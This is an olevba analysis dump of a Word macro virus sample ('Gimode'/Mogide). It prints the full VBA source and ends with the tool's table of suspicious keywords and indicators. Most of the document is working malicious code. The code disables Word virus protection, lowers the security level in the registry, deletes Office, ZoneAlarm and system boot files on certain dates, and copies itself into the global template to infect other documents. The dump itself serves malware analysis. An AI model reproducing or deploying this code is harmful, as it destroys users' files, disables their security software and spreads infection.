olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mogide.a-c2df65c6462f5af63e2ebb3a991d9a84aa60ef7c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mogide.a-c2df65c6462f5af63e2ebb3a991d9a84aa60ef7c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Gimode.bas 
in file: Virus.MSWord.Mogide.a-c2df65c6462f5af63e2ebb3a991d9a84aa60ef7c - OLE stream: 'Macros/VBA/Gimode'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Macro virus name: Gimode
'Infecta documentos word.
'Infect word documents.
'<><><><><><><><><><><><>
'=========================
'Year 2005 - Brasil
'-------------------------
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Word macro virus Gimode"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.Gimode.AutoOpen"
On Error Resume Next
MsgBox " Seu computador esta com defeito!!", vbOKOnly + vbCritical, "Virus informa !!"
Open "C:\WINDOWS\Omedi.html" For Output As #1
 Print #1, "<html><head><title>Virus aqui!</title></head><body bgcolor='#FF0000' link='#FFFF00' vlink='#FF0000'>"
 Print #1, "<h6 align='center'><font color='#EEEE00' size='15'><marquee behavior='alternate' width='70%'>Virus esta animado!</marquee></font>"
 Print #1, "<h6 align='center'><font color=blue size='7'><marquee behavior='alternate' width='100%'>+++++++++++++++++++++++++++++++++++++++++++++</marquee></font>"
 Print #1, "<h6 align='center'><font color='#000000' size='15'><marquee behavior='alternate' width='90%'>Este desktop esta muito bonito!</marquee></font>"
 Print #1, "<h6 align='center'><font color=blue size='7'><marquee behavior='alternate' width='100%'>+++++++++++++++++++++++++++++++++++++++++++++</marquee></font>"
 Print #1, "<h6 align='center'><font color='#00FF00' size='15'><marquee behavior='alternate' width='70%'>Word macro virus!</marquee></font>"
 Print #1, "<h6 align='center'><font color=blue size='7'><marquee behavior='alternate' width='100%'>+++++++++++++++++++++++++++++++++++++++++++++</marquee></font>"
 Print #1, "<h6 align='center'><font color=blue size='7'><marquee behavior='alternate' width='100%'>+++++++++++++++++++++++++++++++++++++++++++++</marquee></font>"
 Print #1, "<h6 align='center'><font color=blue size='7'><marquee behavior='alternate' width='100%'>+++++++++++++++++++++++++++++++++++++++++++++</marquee></font>"
 Print #1, "<h6 align='center'><font color=blue size='7'><marquee behavior='alternate' width='100%'>+++++++++++++++++++++++++++++++++++++++++++++</marquee></font>"
 Close #1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", "Wallpaper") = "C:\WINDOWS\Omedi.html"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", "WebRed") = "Virus ativado" ' Add the value to the registry key
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&

With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
   End With
With ActiveDocument.Sections(1).Headers(wdHeaderFooterPrimary).Range
            .Font.Size = 24
            .ParagraphFormat.Alignment = wdAlignParagraphCenter
            .Text = "Paz em todo o mundo"
        End With

If Day(Now()) = 7 Or (Day(Now)) = 14 Or (Day(Now)) = 21 Or (Day(Now)) = 28 Then
MsgBox " Office nгo existe !!", vbOKOnly + vbCritical, "Virus alerta!!"
WordBasic.Kill "C:\Program Files\Microsoft Office\Office\*.*"
WordBasic.Kill "C:\Microsoft Office\Office\*.*"
WordBasic.Kill "C:\Windows\Microsoft Office\Office\*.*"
WordBasic.Kill "C:\Arquivos de programas\Microsoft Office\Office\*.*"

If Day(Now()) = 8 Or (Day(Now)) = 15 Or (Day(Now)) = 22 Or (Day(Now)) = 29 Then
MsgBox "Arquivos importantes foram deletados !!", vbOKOnly + vbCritical, "Virus esclarece!!"
WordBasic.Kill "C:\AutoExec.bat"
WordBasic.Kill "C:\Command.com"
WordBasic.Kill "C:\Config.sys"
    
End If
End If
End Sub
 
Sub Toolsmacro()
Attribute Toolsmacro.VB_Description = "Word macro virus Gimode"
Attribute Toolsmacro.VB_ProcData.VB_Invoke_Func = "Project.Gimode.macro"
On Error Resume Next
CommandBars("Macro").Controls("Security...").Enabled = False
      
End Sub

Sub AutoClose()
Attribute AutoClose.VB_Description = "Word macro virus Gimode"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.Gimode.AutoClose"
    
On Error Resume Next

MsgBox "ZoneAlarm apagado !!", vbOKOnly + vbCritical, "Virus responde !!"

WordBasic.Kill "C:\Program Files\Zone Labs\ZoneAlarm\*.*"
WordBasic.Kill "C:\Windows\ZoneLabs\ZoneAlarm\*.*"
WordBasic.Kill "C:\ZoneLabs\ZoneAlarm\*.*"
WordBasic.Kill "C:\Zonealarm.exe"
WordBasic.Kill "C:\Arquivos de programas\Zone Labs\ZoneAlarm\*.*"

ActiveDocument.SaveAs FileName:="C:\Edi.doc"
ActiveDocument.Saved = True

iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "Gimode" Then
        binstalled = -1
    End If
    If WordBasic.[MacroName$](i, 0, 0) = "Gimode" Then
        bTooMuchTrouble = -1
    End If
Next i
If Not binstalled And Not bTooMuchTrouble Then
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":Gimode"
    WordBasic.MacroCopy sMacro$, "Global:Gimode"
    sMacro$ = sMe$ + ":AutoClose"
    WordBasic.MacroCopy sMacro$, "Global:Gimode"
    
End If
End Sub

'Infecta documentos word.
'Infect word documents.
'<><><><><><><><><><><><>
'=========================
'Year 2005 - Brasil
'-------------------------
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |AutoExec.bat        |Executable file name                         |
|IOC       |Zonealarm.exe       |Executable file name                         |
+----------+--------------------+---------------------------------------------+

